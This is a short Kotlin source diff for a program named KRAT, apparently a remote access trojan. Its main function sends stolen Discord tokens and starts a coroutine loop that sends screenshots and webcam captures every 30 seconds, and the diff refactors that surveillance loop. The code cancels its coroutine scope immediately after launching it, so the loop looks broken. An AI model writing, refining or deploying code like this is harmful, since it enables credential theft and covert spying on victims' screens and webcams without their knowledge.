@@ -1,7 +1,11 @@
+import kotlinx.coroutines.CoroutineScope
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.cancel
+import kotlinx.coroutines.delay
+import kotlinx.coroutines.isActive
+import kotlinx.coroutines.launch
 import services.Discord
 import java.io.File
-import java.util.concurrent.Executors
-import java.util.concurrent.TimeUnit
 
 object KRAT {
     val user: String = System.getProperty("user.name")
@@ -9,14 +13,19 @@ object KRAT {
 }
 
 fun main() {
-    val scheduler = Executors.newSingleThreadScheduledExecutor()
-
     Discord.sendTokens()
 
-    scheduler.scheduleAtFixedRate({
-        Screen.sendScreenshot()
-        Screen.sendWebcam()
-    }, 0, 30, TimeUnit.SECONDS)
+    val coroutineScope = CoroutineScope(Dispatchers.Default)
+
+    coroutineScope.launch {
+        while (isActive) {
+            Screen.sendScreenshot()
+            Screen.sendWebcam()
+            delay(30_000)
+        }
+    }
+
+    coroutineScope.cancel()
 
     /*.SystemWatcher(Paths.get("C:/Users/${.Main.user}/Downloads"), recursive = true).apply {
         on<.SystemEvent.Created> { println("Created: ${it.path}") }
@@ -25,8 +34,6 @@ fun main() {
 
         start()
     }*/
-
-//    DiscordTokenGrabber.send()
 
 
 }
